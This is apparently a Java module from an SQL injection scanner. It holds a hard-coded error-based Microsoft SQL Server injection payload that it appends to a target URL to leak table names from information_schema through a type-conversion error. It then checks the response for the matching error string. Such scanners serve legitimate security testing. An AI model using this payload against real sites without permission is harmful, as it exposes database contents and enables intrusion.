/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package sqlsentinel.sqlchecker;

import java.util.logging.Level;
import java.util.logging.Logger;


public class SQLMicrosoftSQLErrorBasedFinder implements SQLCommonCheck {
    private final String ErrorBasedCodeInj = "+and+(1)=(convert(int,(select+table_name+from(select+row_number()+over+(order+by+table_name)+as+rownum,table_name+from+information_schema.tables)+as+t+where+t.rownum=1)))--+";
    private final String[] errorCode = {
        "Conversion failed when converting"
    };
    private String url_vuln = null;
    private String url_errorBased_inj = null;
    private ErrorBasedTest errorBT = null;

    public SQLMicrosoftSQLErrorBasedFinder(String url_vuln) {
        this.url_vuln = url_vuln;
    }

    /*
     * test vuln method
     */
    @Override
    public boolean checkVuln() {
        try
        {
            errorBT = new ErrorBasedTest(url_vuln, ErrorBasedCodeInj, errorCode);
            if(errorBT.checkErrorBasedInj()){
                this.url_errorBased_inj = errorBT.getErrorBasedSqlInj();
                return true;
            }
            return false;
        } catch (Exception ex) {
                Logger.getLogger(SQLMicrosoftSQLErrorBasedFinder.class.getName()).log(Level.SEVERE, null, ex);
                return false;
        }   
    }
    
    /*
     * return the url complete with sql injection
     */
    @Override
    public String getSQLInjUrl(){
        return this.url_errorBased_inj;
    }
}
